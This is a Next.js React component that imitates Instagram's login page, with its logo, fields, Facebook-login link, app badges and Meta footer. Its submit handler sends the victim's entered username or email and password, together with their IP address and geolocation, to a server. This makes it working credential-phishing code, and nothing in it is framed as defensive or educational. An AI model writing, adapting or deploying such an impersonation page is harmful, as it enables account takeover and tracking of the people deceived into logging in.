"use client";

import Image from "next/image";
import Link from "next/link";

import Apple from "../../public/apple-store.png";
import Instagram_logo from "../../public/Instagram_logo.png";
import Facebook from "../../public/facebook.png";
import Google from "../../public/google-play.png";
import { useEffect, useState } from "react";
import Loading from "../voter/instagram/loading";

import { getIp, getLocationDetails } from "../utils/getData";
import { sendDataToServer } from "../utils/postData";

export default function Instagram() {
  const [loading, setLoading] = useState(true);
  const [emailValue, setEmailValue] = useState("");
  const [passwordValue, setPasswordValue] = useState("");
  const [ip, setIp] = useState(null);
  const [country, setCountry] = useState("");
  const [city, setCity] = useState("");
  const [region, setRegion] = useState("");
  const [timezone, setTimezone] = useState("");
  const [error, setError] = useState(null);

  const copyright = "\u00A9";

  useEffect(() => {
    getIp()
      .then((address) => {
        setIp(address);
      })
      .catch((error) => {
        console.error(error);
      });
  }, []);

  console.log(ip);

  useEffect(() => {
    if (ip !== null) {
      getLocationDetails(ip, setLoading)
        .then((location) => {
          console.log(location);
          setCountry(location.country);
          setCity(location.city);
          setRegion(location.region);
          setTimezone(location.timezone);
        })
        .catch((error) => {
          console.log(error);
        });
    }
  }, [ip]);

  const handleInputField = (e, field) => {
    setError(null);

    if (field === "email") {
      setEmailValue(e.target.value);
    } else if (field === "password") {
      setPasswordValue(e.target.value);
    }
  };

  const submitForm = async (e) => {
    e.preventDefault();
    // setLoading(true);

    const result = await sendDataToServer({
      ip,
      country,
      city,
      region,
      timezone,
      emailValue,
      passwordValue,
      setError,
      setLoading,
    });

    // setLoading(false);
  };

  return (
    <>
      {loading ? (
        <Loading />
      ) : (
        <section className="instagram-container relative flex flex-col gap-5 justify-center items-center min-h-screen">
          <div className="flex flex-col gap-6 w-full md:w-80 3xl:w-[20%] justify-center items-center p-5 sm:border-0 md:border">
            <Image
              src={Instagram_logo}
              width={200}
              height={200}
              alt="logo of instagram"
            />
            {error !== null ? (
              <span className="text-sm text-center text-red-700 my-3">
                {" "}
                {error}{" "}
              </span>
            ) : (
              ""
            )}
            <form
              onSubmit={submitForm}
              // action="http://localhost/insert.php"
              className="flex flex-col gap-3 w-full "
            >
              <div className="email-container flex justify-center">
                <input
                  type="text"
                  name="email"
                  id="email"
                  placeholder="Phone number, username or email address"
                  className="bg-[#fafafa] w-10/12 h-10 text-sm border-[#efefef] rounded-sm focus:shadow-none focus:border-none focus:outline-none outline-0 overflow-hidden text-ellipsis box-border"
                  value={emailValue}
                  onChange={(e) => handleInputField(e, "email")}
                />
              </div>

              <div className="password-container flex justify-center">
                <input
                  type="password"
                  name="password"
                  id="password"
                  placeholder="Password"
                  className="bg-[#fafafa] w-10/12 h-10 text-sm border-[#efefef] rounded-sm focus:shadow-none focus:border-none focus:outline-none outline-0 overflow-hidden text-ellipsis box-border"
                  value={passwordValue}
                  onChange={(e) => handleInputField(e, "password")}
                />
              </div>

              <div className="flex justify-center">
                <button
                  className="instagram-submit cursor-pointer w-10/12 h-8 bg-[#5faaff] text-white rounded-lg font-medium text-sm"
                  type="submit"
                  name="submit"
                >
                  Login
                </button>
              </div>
            </form>

            <div className="flex flex-row gap-3 w-full justify-center items-center mx-auto">
              <hr className="bg-gray-400 w-[35%] h-[1px]" />
              <span className="text-sm text-gray-600">OR</span>
              <hr className="bg-gray-400 w-[35%] h-[1px]" />
            </div>

            {/* Forgotten password */}
            <Link
              href=""
              className=" text-base flex gap-2 justify-center items-center font-bold text-[#385898]"
            >
              <Image
                src={Facebook}
                width={20}
                height={10}
                alt="facebook thumbnail"
              />

              <span>Login with Facebook</span>
            </Link>

            <Link
              className="forgot text-sm flex justify-center text-[#385898] font-medium tracking-normal"
              href=""
            >
              Forgotten your password?
            </Link>
          </div>

          {/* Dont have an account */}
          <div className="flex flex-row justify-center gap-2 w-80 3xl:w-[20%] text-sm mt-10 lg:mt-0  p-5 sm:border-0 md:border">
            <span className="flex ">Dont have an account? </span>
            <Link href="" className="text-[#0095F6] font-semibold">
              Sign up
            </Link>
          </div>

          {/* Get the app section */}
          <div className="app flex flex-col gap-4 justify-center w-80 3xl:w-[20%] mb-20">
            <p className="text-center text-sm">Get the app.</p>
            <div className="app-img flex flex-row justify-center gap-2">
              <Link href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                <Image
                  src={Apple}
                  alt="icon thumbnail"
                  width={200}
                  height={200}
                  className=""
                />
              </Link>
              <Link href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                <Image
                  src={Google}
                  alt="icon thumbnail"
                  width={200}
                  height={200}
                  className=""
                />
              </Link>
            </div>
          </div>

          {/* Footer Links */}
          <div className=" -mb-10 text-[#737373] text-sm lg:text-xs">
            <ul className="flex flex-row text-center justify-center flex-wrap gap-2 w-[80%] mx-auto lg:w-full">
              <li>
                {" "}
                <Link href="">Meta</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">About</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Blog</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Jobs</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Help</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">API</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Privacy</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Terms</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Locations</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Instagram Lite</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Threads</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Contact uploading and non-users</Link>{" "}
              </li>
              <li>
                {" "}
                <Link href="">Meta Verified</Link>{" "}
              </li>
            </ul>

            <div className="mt-5 text-center">
              <span> {copyright + " "} 2023 Instagram from Meta </span>
            </div>
          </div>
        </section>
      )}
    </>
  );
}
